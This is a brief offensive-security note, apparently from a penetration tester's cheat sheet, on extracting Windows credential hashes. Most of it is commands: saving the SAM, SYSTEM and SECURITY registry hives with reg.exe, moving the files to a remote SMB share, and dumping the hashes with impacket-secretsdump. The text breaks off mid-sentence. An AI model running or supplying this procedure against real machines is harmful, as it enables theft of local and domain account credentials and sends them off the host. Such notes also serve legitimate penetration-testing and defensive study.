In Windows, we have different ways to extract user credentials in hash form.

Registry Hives - SAM, SYSTEM and SECURITY

-Extracting 3 hives via reg.exe
```
#Require ps/cmd in admin privilege
reg.exe save hklm\sam <abspath_desired>
reg.exe save hklm\system <abspath_desired>
reg.exe save hklm\security <abspath_desired>
```
Only sam and system is a must as with this combination, we have access to local user hashes, yet if its domain user we are after, security is also required.

We can move the files to our server with any means we like, yet if only command line is available, moving via smb is recommended.
```
move <hivefile> \\<ip>\<share>
```

After that, we can use impacket-secretsdump to extract the hashes
```
impacket-secretsdump -sam <samfile> -security <securityfile> -system <systemfile> -outputfile <fname> LOCAL
```

After that, 